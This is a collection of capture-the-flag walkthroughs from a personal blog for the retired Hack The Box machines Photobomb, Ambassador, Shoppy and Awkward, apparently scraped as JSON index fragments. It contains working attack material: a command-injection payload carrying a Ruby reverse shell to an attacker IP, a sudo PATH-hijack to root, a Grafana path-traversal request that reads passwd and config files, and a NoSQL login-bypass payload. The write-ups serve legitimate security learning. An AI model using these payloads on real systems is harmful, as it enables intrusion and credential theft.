fopen(\"{$STORE_HOME}cart/{$file}\", \"r\"); $details = array(); while (($line = fgets($product_file)) !== false) { if(str_re","date":"2023-02-25","objectID":"/2023-02-25-awkward-htb/:4:0","tags":["htb","security","penetration testing","ctf","vue","php","node"],"title":"Awkward HTB Walkthrough","uri":"/2023-02-25-awkward-htb/"},{"categories":null,"content":"Conclusion This one was quite time consuming and frustrating. I stumbled on the awk LFI and sed command injection. I have to remind myself when doing any kind of injection to always be mindful of the string I’m passing, and if possible, aim for it to be syntactically valid once injected – otherwise the shelled out command may fail and we miss out on LFI or command injection. It’s easy to see something, get caught up in the excitement of it all and throw variations at it without carefully crafting a payload and considering whether or not commands are likely to error before we get what we need. Brute forcing a weak JWT signing key was new to me, and the SSRF for the url param initially seemed obvious, but I was blocked for a little while before deciding to try fuzzing ports. Once again, I needed to remind myself to not just blindly enumerate and fuzz, but look at the broader context and story – which in this case, involved reminding myself that this was a development server running webpack dev server, and likely not deployed on production-like ports (80, 8080, etc). I also spent way too much time trying to decompile the webpack bundle VueJS site (not shown in my notes above), hoping to get cleaner JavaScript for the purposes of finding available routes. After trying a few tools unsuccessfully, in the end I just parsed the file manually (not fun). Overall a fun machine though, even if it involved a couple of days on and off with regular breaks to step away from the frustration of hitting a brick wall multiple times. ","date":"2023-02-25","objectID":"/2023-02-25-awkward-htb/:5:0","tags":["htb","security","penetration testing","ctf","vue","php","node"],"title":"Awkward HTB Walkthrough","uri":"/2023-02-25-awkward-htb/"},{"categories":null,"content":"Introduction An easy rated machine, and one of my first on HTB that was recently retired. This box was pwned before I started using MarkText and adding in screenshots to my markdown notes, so I’ve only captured STDOUT here, and the entire write up is boring plain text.. sorry. As always, I use Parrot OS Security Edition in a VirtualBox VM, with the OpenVPN client to connect to the HackTheBox VPN. ","date":"2023-02-11","objectID":"/2023-02-11-photobomb/:1:0","tags":["pentesting","security","penetration testing","ctf","sinatra","sudo"],"title":"Photobomb HTB Walkthrough","uri":"/2023-02-11-photobomb/"},{"categories":null,"content":"Enumeration Nmap -sC and -sV shows 22 (ssh) and http (80) open. Navigating to http://10.10.11.182/ redirects to http://photobomb.htb. After adding this domain to /etc/hosts, we see a landing page for Photobomb franchise, with a link to http://photobomb.htb/printer – which presents a basic auth dialog. Again, no screenshots, so you will need to use your imagination or just trust me. Let’s start up gobuster in the background while poking around: gobuster dir -u http://photobomb.htb -w /usr/share/dirb/wordlists/common.txt This only returns a favicon and /printer plus /printers, both of which require a user/pass, but if I run gobuster with the /usr/share/dirb/wordlists/big.txt wordlist, I notice: =============================================================== 2022/12/25 13:06:09 Starting gobuster in directory enumeration mode =============================================================== /[ (Status: 400) [Size: 273] /] (Status: 400) [Size: 273] /favicon.ico (Status: 200) [Size: 10990] /plain] (Status: 400) [Size: 278] /printer (Status: 401) [Size: 188] /printer-friendly (Status: 401) [Size: 188] /printerfriendly (Status: 401) [Size: 188] /printer_friendly (Status: 401) [Size: 188] /printers (Status: 401) [Size: 188] /quote] (Status: 400) [Size: 278] Manually checking some of the above: Bad Request bad URI `/quote]'. WEBrick/1.6.0 (Ruby/2.7.0/2019-12-25) at photobomb:4567 So maybe I should look at WEBrick vulns.. but should quickly look at the rest of the site before going deep into a rabbit hole and never returning. I found the following javascript http://photobomb.htb/photobomb.js, which is requested when visiting the home page. I basically just leave the Firefox developer tools open and see what interesting looking requests are made, but intercepting via Burp Suite and looking at the Site map is also a good option here – especially as the number of files, directories and general structure of the site become larger and more complex. Burp suite will build up a better picture of what the site looks like over time as you navigate around, fire off requests, etc. Anyway, the javascript file in question contains: function init() { // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me if (document.cookie.match(/^(.*;)?\\s*isPhotoBombTechSupport\\s*=\\s*[^;]+(.*)?$/)) { document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer'); } } window.onload = init; Confirmed I am able to log in to http://pH0t0:b0Mb!@photobomb.htb/printer , which gives me a gallery of JPEG thumbnails along with a big red DOWNLOAD PHOTO TO PRINT button, and a drop-down to select the file format. Burp suite captures the following when intercepting POST requests to download an image in a selected file format via the UI: POST /printer HTTP/1.1 Host: photobomb.htb User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://photobomb.htb/printer Content-Type: application/x-www-form-urlencoded Content-Length: 79 Origin: http://photobomb.htb DNT: 1 Authorization: Basic cEgwdDA6YjBNYiE= Connection: close Upgrade-Insecure-Requests: 1 Pragma: no-cache Cache-Control: no-cache photo=masaaki-komori-NYFaNoiPf7A-unsplash.jpg\u0026filetype=jpg\u0026dimensions=3000x2000 After logging in, I can also hit the /printers endpoint I found earlier, which indicates it’s a Sinatra app: Sinatra doesn’t know this ditty. Try this: get '/printers' do \"Hello World\" end ","date":"2023-02-11","objectID":"/2023-02-11-photobomb/:2:0","tags":["pentesting","security","penetration testing","ctf","sinatra","sudo"],"title":"Photobomb HTB Walkthrough","uri":"/2023-02-11-photobomb/"},{"categories":null,"content":"Foothold I initially tried to use commix for command injection, but it kept erroring out. I then tried command injection into the photo param without any success. But then I was able to confirm command injection by sending the following payload to /printer: photo=voicu-apostol-MWER49YaD-M-unsplash.jpg\u0026filetype=jpg;sleep 15\u0026dimensions=30x20 So, we basically escape the file type with a semi-colon ;, no need for quotes, double-quotes etc. I confirmed the endpoint appeared to become unresponsive for ~15 seconds as expected. I had issues with typical bash reverse shells, and assumed injecting into the file type was working as the application maybe (?) shells out to bash to run imagemagick or similar in order to convert the image format on the fly, but I was able to use a URL encoded ruby shell from revshells.com: ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=\u003eTCPSocket.new(\"10.10.14.3\",6969))' When injected, by setting Burp Suite to automagically HTML encode my payload, we end up sending the following in the body of the POST request: photo=voicu-apostol-MWER49YaD-M-unsplash.jpg\u0026filetype=jpg;ruby%20-rsocket%20-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%2210.10.14.3%22%2C6969%29%29%27\u0026dimensions=30x20 I confirmed I now had a reverse shell: $nc -lvnp 6969 listening on [any] 6969 ... connect to [10.10.14.3] from (UNKNOWN) [10.10.11.182] 50358 python3 -c 'import pty; pty.spawn(\"/bin/bash\")' wizard@photobomb:~/photobomb$ id id uid=1000(wizard) gid=1000(wizard) groups=1000(wizard) wizard@photobomb:~/photobomb$ find / -name 'user.txt' 2\u003e /dev/null find / -name 'user.txt' 2\u003e /dev/null /home/wizard/user.txt wizard@photobomb:~/photobomb$ cat /home/wizard/user.txt cat /home/wizard/user.txt 0afc4ac78d0ff030a8ee3a05821cabf1 So I have the user flag, taken from wizard’s account! ","date":"2023-02-11","objectID":"/2023-02-11-photobomb/:3:0","tags":["pentesting","security","penetration testing","ctf","sinatra","sudo"],"title":"Photobomb HTB Walkthrough","uri":"/2023-02-11-photobomb/"},{"categories":null,"content":"Privilege Escalation Now on to privilege escalation. First, let’s try the low hanging fruit: wizard@photobomb:~/photobomb$ sudo -l sudo -l Matching Defaults entries for wizard on photobomb: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User wizard may run the following commands on photobomb: (root) SETENV: NOPASSWD: /opt/cleanup.sh So we can run /opt/cleanup.sh.. Looking at this script: wizard@photobomb:~/photobomb$ cat /opt/cleanup.sh cat /opt/cleanup.sh #!/bin/bash . /opt/.bashrc cd /home/wizard/photobomb # clean up log files if [ -s log/photobomb.log ] \u0026\u0026 ! [ -L log/photobomb.log ] then /bin/cat log/photobomb.log \u003e log/photobomb.log.old /usr/bin/truncate -s0 log/photobomb.log fi # protect the priceless originals find source_images -type f -name '*.jpg' -exec chown root:root {} \\; The commands are absolute paths except for find. I tried copying /bin/bash to /tmp/find, and running the script while preserving my environment with the -E flag, which disables the env_reset option: PATH=\"/tmp:$PATH\" sudo -E /opt/cleanup.sh So, when the shell attempts to run find, it first checks the /tmp directory, and instead would execute my copy of bash. However, this wasn’t working, and after a few minutes of digging through the sudo man page I noticed the env_reset in sudo -l output will reset the path, however also noticed that SETENV is enabled. So, I was able to pick up my fake find executable with a plain old: wizard@photobomb:~/photobomb$ sudo PATH=\"/tmp:$PATH\" /opt/cleanup.sh root@photobomb:/home/wizard/photobomb# id uid=0(root) gid=0(root) groups=0(root) root@photobomb:/home/wizard/photobomb# cat /root/root.txt adc699daf52cc1ba2c0d95e5cc85f007 So the /opt/cleanup.sh script runs as root, and locates the find command in /tmp, which is actually a copy of bash – giving us a root shell. Machine completed! https://www.hackthebox.com/achievement/machine/329250/500 ","date":"2023-02-11","objectID":"/2023-02-11-photobomb/:4:0","tags":["pentesting","security","penetration testing","ctf","sinatra","sudo"],"title":"Photobomb HTB Walkthrough","uri":"/2023-02-11-photobomb/"},{"categories":null,"content":"Conclusion Quite straight forward with basic web enumeration – a javascript file with hardcoded basic auth creds, leading into a basic web app that displays a photo gallery. Looking at web requests, we can see a param for filetype in the form data which we can inject into after failing to inject into filename. I struggled to get a basic bash reverse shell working, but knowing the app is a Ruby-based Sinatra app, we can inject a Ruby reverse shell that calls out to sh and pipes the output to a TCP socket in order to gain foothold. From here, we can take advantage of a script we can run as sudo by clobbering the expected find executable’s location in PATH. While env_reset is enabled which causes commands to be executed with a minimal environment, the SETENV option is set, which allows us to prefix a directory to PATH – this directory is enumerated first, finding and executing our renamed bash command as find – giving us a root shell. Looking forward to posting the next one! ","date":"2023-02-11","objectID":"/2023-02-11-photobomb/:5:0","tags":["pentesting","security","penetration testing","ctf","sinatra","sudo"],"title":"Photobomb HTB Walkthrough","uri":"/2023-02-11-photobomb/"},{"categories":null,"content":"Intro This was my first medium difficulty box. I noticed it was the highest rated and due to be retired in 2 days – so I decided to tackle this machine in order to quickly release a walkthrough (content creation! clicks! views!) and practice my note taking skills. While I enjoy being in ’the zone’, it is well worthwhile breaking momentarily to take comprehensive notes that can be weaved into a cohesive narrative – if only so I can retrace my steps and help with future CTF challenges. I’m guessing this may have been on the easier side of Medium difficulty, as I went from an nmap scan to root in a little under two hours. Enumeration, exploitation and privilege escalation were fairly straight forward – with privesc being a little less obvious in places. ","date":"2023-01-29","objectID":"/2023-01-29-ambassador-htb/:1:0","tags":["pentesting","security","penetration testing","ctf","consul","grafana"],"title":"Ambassador HTB Walkthrough","uri":"/2023-01-29-ambassador-htb/"},{"categories":null,"content":"Enumeration Initial nmap scan: $nmap -sC -sV -o nmap/initial 10.10.11.183 Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-26 20:07 AEDT Nmap scan report for 10.10.11.183 Host is up (0.022s latency). Not shown: 996 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 29:dd:8e:d7:17:1e:8e:30:90:87:3c:c6:51:00:7c:75 (RSA) |_ 256 f5:90:ba:7d:ed:55:cb:70:07:f2:bb:c8:91:93:1b:f6 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Ambassador Development Server |_http-generator: Hugo 0.94.2 |_http-server-header: Apache/2.4.41 (Ubuntu) 3000/tcp open ppp? | fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 302 Found | Cache-Control: no-cache | Content-Type: text/html; charset=utf-8 | Expires: -1 | Location: /login | Pragma: no-cache | Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax | X-Content-Type-Options: nosniff | X-Frame-Options: deny | X-Xss-Protection: 1; mode=block | Date: Thu, 26 Jan 2023 09:07:55 GMT | Content-Length: 29 | href=\"/login\"\u003eFound\u003c/a\u003e. | GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 302 Found | Cache-Control: no-cache | Content-Type: text/html; charset=utf-8 | Expires: -1 | Location: /login | Pragma: no-cache | Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax | X-Content-Type-Options: nosniff | X-Frame-Options: deny | X-Xss-Protection: 1; mode=block | Date: Thu, 26 Jan 2023 09:07:24 GMT | Content-Length: 29 | href=\"/login\"\u003eFound\u003c/a\u003e. | HTTPOptions: | HTTP/1.0 302 Found | Cache-Control: no-cache | Expires: -1 | Location: /login | Pragma: no-cache | Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax | X-Content-Type-Options: nosniff | X-Frame-Options: deny | X-Xss-Protection: 1; mode=block | Date: Thu, 26 Jan 2023 09:07:30 GMT |_ Content-Length: 0 3306/tcp open mysql MySQL 8.0.30-0ubuntu0.20.04.2 |_sslv2: ERROR: Script execution failed (use -d to debug) | mysql-info: | Protocol: 10 | Version: 8.0.30-0ubuntu0.20.04.2 | Thread ID: 22 | Capabilities flags: 65535 | Some Capabilities: Support41Auth, FoundRows, LongColumnFlag, IgnoreSigpipes, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, SwitchToSSLAfterHandshake, SupportsTransactions, LongPassword, Speaks41ProtocolOld, InteractiveClient, ConnectWithDatabase, SupportsCompression, ODBCClient, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults | Status: Autocommit | Salt: edl\\x1CrF\\KY\\x06\u0026D?WD\\x12[FEj |_ Auth Plugin Name: caching_sha2_password |_tls-alpn: ERROR: Script execution failed (use -d to debug) |_ssl-cert: ERROR: Script execution failed (use -d to debug) |_ssl-date: ERROR: Script execution failed (use -d to debug) |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug) 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port3000-TCP:V=7.92%I=7%D=1/26%Time=63D242CD%P=x86_64-pc-linux-gnu%r(Ge SF:nericLines,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20t SF:ext/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x SF:20Request\")%r(GetRequest,174,\"HTTP/1\\.0\\x20302\\x20Found\\r\\nCache-Contro SF:l:\\x20no-cache\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nExpir SF🇪🇸\\x20-1\\r\\nLocation:\\x20/login\\r\\nPragma:\\x20no-cache\\r\\nSet-Cookie:\\ SF:x20redirect_to=%2F;\\x20Path=/;\\x20HttpOnly;\\x20SameSite=Lax\\r\\nX-Conten SF:t-Type-Options:\\x20nosniff\\r\\nX-Frame-Options:\\x20deny\\r\\nX-Xss-Protect SF:ion:\\x201;\\x20mode=block\\r\\nDate:\\x20Thu,\\x2026\\x20Jan\\x202023\\x2009:07 SF::24\\x20GMT\\r\\nContent-Length:\\x2029\\r\\n\\r\\n\u003ca\\x20href=\\\"/login\\\"\u003eFound\u003c SF:/a\u003e\\.\\n\\n\")%r(Help,67,\"HTTP/","date":"2023-01-29","objectID":"/2023-01-29-ambassador-htb/:2:0","tags":["pentesting","security","penetration testing","ctf","consul","grafana"],"title":"Ambassador HTB Walkthrough","uri":"/2023-01-29-ambassador-htb/"},{"categories":null,"content":"Foothold The login page for Grafana shows v8.2.0, and after a very quick search, I discover GitHub - jas502n/Grafana-CVE-2021-43798: Grafana Unauthorized arbitrary file reading vulnerability Now, copying the GET /login HTTP request for the page into Burp Suite’s repeater, and trying the very first URL for path traversal to see if we can traverse back to the root of the file system, and read /etc/passwd: GET /public/plugins/alertGroups/../../../../../../../../etc/passwd HTTP/1.1 Host: 10.10.11.183:3000 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate DNT: 1 Connection: close Cookie: redirect_to=%2Fpublic%2Fplugins%2Falertlist%2F Upgrade-Insecure-Requests: 1 we are successful - here’s the response showing /etc/passwd: HTTP/1.1 200 OK Accept-Ranges: bytes Cache-Control: no-cache Content-Length: 1983 Content-Type: text/plain; charset=utf-8 Expires: -1 Last-Modified: Mon, 14 Mar 2022 02:56:37 GMT Pragma: no-cache X-Content-Type-Options: nosniff X-Frame-Options: deny X-Xss-Protection: 1; mode=block Date: Thu, 26 Jan 2023 10:03:19 GMT Connection: close root❌0:0:root:/root:/bin/bash daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin bin❌2:2:bin:/bin:/usr/sbin/nologin sys❌3:3:sys:/dev:/usr/sbin/nologin sync❌4:65534:sync:/bin:/bin/sync games❌5:60:games:/usr/games:/usr/sbin/nologin man❌6:12:man:/var/cache/man:/usr/sbin/nologin lp❌7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail❌8:8:mail:/var/mail:/usr/sbin/nologin news❌9:9:news:/var/spool/news:/usr/sbin/nologin uucp❌10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy❌13:13:proxy:/bin:/usr/sbin/nologin www-data❌33:33:www-data:/var/www:/usr/sbin/nologin backup❌34:34:backup:/var/backups:/usr/sbin/nologin list❌38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc❌39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats❌41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody❌65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network❌100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve❌101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync❌102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus❌103:106::/nonexistent:/usr/sbin/nologin syslog❌104:110::/home/syslog:/usr/sbin/nologin _apt❌105:65534::/nonexistent:/usr/sbin/nologin tss❌106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd❌107:112::/run/uuidd:/usr/sbin/nologin tcpdump❌108:113::/nonexistent:/usr/sbin/nologin landscape❌109:115::/var/lib/landscape:/usr/sbin/nologin pollinate❌110:1::/var/cache/pollinate:/bin/false usbmux❌111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd❌112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump❌999:999:systemd Core Dumper:/:/usr/sbin/nologin developer❌1000:1000:developer:/home/developer:/bin/bash lxd❌998💯:/var/snap/lxd/common/lxd:/bin/false grafana❌113:118::/usr/share/grafana:/bin/false mysql❌114:119:MySQL Server,,,:/nonexistent:/bin/false consul❌997:997::/home/consul:/bin/false Let’s filter out users without a valid shell, which may be useful for SSH access later: $grep -ivE \"/bin/false|/usr/sbin/nologin\" passwd.txt root❌0:0:root:/root:/bin/bash sync❌4:65534:sync:/bin:/bin/sync developer❌1000:1000:developer:/home/developer:/bin/bash consul❌997:997::/home/con Reading through Grafana documentation, seeing where the config file is usually stored, and running a GET /public/plugins/alertGroups/../../../../../../../../etc/grafana/grafana.ini provides us the admin password. Fun times: # default admin password, can be changed before first start of grafana, or in profile settings admin_password = messageInABottle685427 And we can login to the Grafana web interface successfully: I also tried other opportunistic files in the above path traversal, notably /home/con/.ssh/id_rsa and /home/developer/.ssh/id_rsa, but rece","date":"2023-01-29","objectID":"/2023-01-29-ambassador-htb/:3:0","tags":["pentesting","security","penetration testing","ctf","consul","grafana"],"title":"Ambassador HTB Walkthrough","uri":"/2023-01-29-ambassador-htb/"},{"categories":null,"content":"Privilege Escalation I won’t write every gory detail here, but suffice to say, I tried low hanging fruit: sudo – can’t run sudo as developer user no unusual processes running no setuid binaries I can execute nothing in my home directory nothing unusual in my printenv there’s a path /development-machine-documentation/, which contains the static hugo site we found earlier – it contains a deploy.sh which copies files into /var/www/html. Nothing stood out here as helpful to gaining root The most obvious thing running as root that looked interesting was the consul agent: developer@ambassador:/etc/consul.d/config.d$ ps aux | grep consul root 1070 0.4 3.8 795828 76960 ? Ssl 05:26 1:28 /usr/bin/consul agent -config-dir=/etc/consul.d/config.d -config-file=/etc/consul.d/consul.hcl Unfortunately, I didn’t have permission to read the config directory or file passed as params to the process. According to documentation, the agent should run on TCP 8500 and 8501 for HTTP and HTTPS respectively Required Ports | Consul | HashiCorp Developer. So checking netstat: developer@ambassador:/etc/consul.d/config.d$ netstat -tupln (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:8301 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8302 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8500 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8600 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:33060 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:3306 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8300 0.0.0.0:* LISTEN - With no idea how to interact with it, I confirmed I could hit the HTTP server locally from the machine, but not from my own machine – so I assumed it was firewalled but accessible locally: developer@ambassador:/etc/consul.d/config.d$ curl -v \"http://127.0.0.1:8500/v1/agent/checks\" * Trying 127.0.0.1:8500... * TCP_NODELAY set * Connected to 127.0.0.1 (127.0.0.1) port 8500 (#0) \u003e GET /v1/agent/checks HTTP/1.1 \u003e Host: 127.0.0.1:8500 \u003e User-Agent: curl/7.68.0 \u003e Accept: */* \u003e * Mark bundle as not supporting multiuse \u003c HTTP/1.1 200 OK \u003c Content-Type: application/json \u003c Vary: Accept-Encoding \u003c X-Consul-Default-Acl-Policy: deny \u003c Date: Thu, 26 Jan 2023 11:19:46 GMT \u003c Content-Length: 2 \u003c * Connection #0 to host 127.0.0.1 left intact I tried to check the agent version, but get a permission denied: developer@ambassador:~$ curl --silent http://localhost:8500/v1/agent/self Permission denied: token with AccessorID '00000000-0000-0000-0000-000000000002' lacks permission 'agent:read' on \"ambassador\"developer@ambassador:~$ This led me to wonder if i could create my own token to pass to the API. Unfortunately I lacked acl:write permission. I tried a few different JSON payloads in curl against /v1/agent/check/register, including “script”, with a reverse shell but nothing seemed to work. I also tried consul acl token list thinking perhaps the developer user had more access to consul than a HTTP request, but didn’t have acl:read either. My access was very restricted :( Searching the file system for consul, I found a bash script in a directory for an app that looks familiar (whackywidget): developer@ambassador:/opt$ find / -name '*consul*' 2\u003e /dev/null ..snip.. /opt/consul /opt/my-app/whackywidget/put-config-in-consul.sh /usr/lib/systemd/system/consul.service /usr/bin/consul developer@ambassador:/opt$ cat /opt/my-app/whackywidget/put-config-in-consul.sh # We use Consul for application config in production, this script will help set the correct values for the app # Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD So CONSUL_HTTP_TOKEN needs to be set, and searching the file system yielded nothing. I noticed in /opt/my-app/ a .git directory. Running a git log -p to show the commit diffs ","date":"2023-01-29","objectID":"/2023-01-29-ambassador-htb/:4:0","tags":["pentesting","security","penetration testing","ctf","consul","grafana"],"title":"Ambassador HTB Walkthrough","uri":"/2023-01-29-ambassador-htb/"},{"categories":null,"content":"Conclusion The most difficult part for this challenge was the privilege escalation – luckily consul seemed like the first (and only?) obvious process running as root that could be exploitable – so it was the clear first choice for investigating privesc. Uncovering the bash script was easy, but I stumbled a little before finding the git logs to get the token I could use with the API. After this, registering a “service” to give me a reverse shell was quite easy. A fun VM, but perhaps easier than I expected for Medium difficulty. I’m interested to see how challenging the next one is. I had not thought to find and check the logs of github repositories on compromised machines before, so this has been added to my arsenal of things to look out for and enumerate. The temptation often is to break out LinPEAS and just scan, but getting a ‘feel’ for a server – what does it appear to be used for? what story does it tell? and what kind of things should I be looking for? – and enumerating on a case by case basis seems to be a nicer way to narrow down the possibilities without being overwhelmed by all the potentials of enumerating many things at once. ","date":"2023-01-29","objectID":"/2023-01-29-ambassador-htb/:5:0","tags":["pentesting","security","penetration testing","ctf","consul","grafana"],"title":"Ambassador HTB Walkthrough","uri":"/2023-01-29-ambassador-htb/"},{"categories":null,"content":"Intro I have been spending some time over the holiday break working on CTF challenges - including both Hack The Box, PicoCTF and learning a little binary exploitation. Taking notes for my own review \u0026 learning seemed like a good opportunity to post up CTF walkthroughs and get back into the habit of blogging again. So, here is the first of hopefully many walkthroughs I will post up as time permits, and when machines on Hack The Box are retired. ","date":"2023-01-14","objectID":"/2023-01-14-shoppy-htb/:1:0","tags":["pentesting","security","penetration testing","ctf","docker","reversing"],"title":"Shoppy HTB Walkthrough","uri":"/2023-01-14-shoppy-htb/"},{"categories":null,"content":"Enumeration As always, we connect to the HTB VPN using OpenVPN, and join the machine to be given an IP address. All work is done from a Parrot OS VirtualBox VM. Firstly, a quick nmap scan: $nmap -sC -sV -o nmap/initial 10.10.11.180 Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-25 15:38 AEDT Nmap scan report for 10.10.11.180 Host is up (0.020s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA) | 256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA) |_ 256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519) 80/tcp open http nginx 1.23.1 |_http-title: Did not follow redirect to http://shoppy.htb |_http-server-header: nginx/1.23.1 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect res Browsing to http://10.10.11.180 redirects to http://shoppy.htb, so I added this to my /etc/hosts file. Browsing to http://shoppy.htb gives a landing page with a countdown: Gobuster output using common.txt wordlist: $gobuster dir -u \"http://shoppy.htb\" -w /usr/share/dirb/wordlists/common.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://shoppy.htb [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/dirb/wordlists/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/12/25 15:53:38 Starting gobuster in directory enumeration mode =============================================================== /admin (Status: 302) [Size: 28] [--\u003e /login] /Admin (Status: 302) [Size: 28] [--\u003e /login] /ADMIN (Status: 302) [Size: 28] [--\u003e /login] /assets (Status: 301) [Size: 179] [--\u003e /./] /css (Status: 301) [Size: 173] [--\u003e /css/] /exports (Status: 301) [Size: 181] [--\u003e /exports/] /favicon.ico (Status: 200) [Size: 213054] /fonts (Status: 301) [Size: 177] [--\u003e /fonts/] /images (Status: 301) [Size: 179] [--\u003e /images/] /js (Status: 301) [Size: 171] [--\u003e /js/] /login (Status: 200) [Size: 1074] /Login (Status: 200) [Size: 1074] =============================================================== 2022/12/25 15:53:49 Finished =============================================================== ","date":"2023-01-14","objectID":"/2023-01-14-shoppy-htb/:2:0","tags":["pentesting","security","penetration testing","ctf","docker","reversing"],"title":"Shoppy HTB Walkthrough","uri":"/2023-01-14-shoppy-htb/"},{"categories":null,"content":"Foothold I attempted to run sqlmap against http://shoppy.htb/login, but kept getting timeout errors: [17:43:29] [CRITICAL] connection timed out to the target URL or proxy. sqlmap is going to retry the request(s) [17:44:59] [CRITICAL] connection timed out to the target URL or proxy I next ran sqlmap through burp suite and checked the intercepted traffic: $sqlmap -u \"http://shoppy.htb/login\" --data \"username=*\u0026password=*\" --proxy \"http://127.0.0.1:8080\" --headers=\"User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0\" At this point, it appeared to my novice eyes as though a WAF (web app firewall) was blocking SQL injection attempts (maybe?) as ’normal’ login attempts result in a 302 redirect, not a 504 gateway timeout. I did notice the timeouts only occur when injecting into user, not password – so I suspected that this was the exploitable input field.. But the above was a modified intercepted request from Firefox with a legitimate user agent string along with other headers – so perhaps not a WAF and something else?.. After a little while of unsuccessful SQL Injection both with SQLMap and y, I back tracked a little to look at other injection techniques and started reading NoSQL injection - HackTricks I then tried the following to see if I was dealing with some document database that could be injected into: POST /login HTTP/1.1 Content-Length: 42 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0 Host: shoppy.htb Accept: */* Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=utf-8 Connection: close username=admin' || 1==1%00\u0026password=foobar The initial example of username=admin' || 1==1//\u0026password=foobar gave a 504, but the above worked and gave the following response!: HTTP/1.1 302 Found Server: nginx/1.23.1 Date: Sun, 25 Dec 2022 07:38:44 GMT Content-Type: text/plain; charset=utf-8 Content-Length: 28 Connection: close Location: /admin Vary: Accept Set-Cookie: connect.sid=s%3Aw1vzR-3zSPV98eF-hiBqdfT8SFB4-Omf.s03gQG0EK%2F4m8xUI8cB0EP5xTTqOk7SEFv9W16yAxJY; Path=/; HttpOnly Found. Redirecting to /admin After the redirect I ended up at /admin: The page looks fairly static, apart from the Search for users button which does a GET http://shoppy.htb/admin/search-users . If i inject into this with 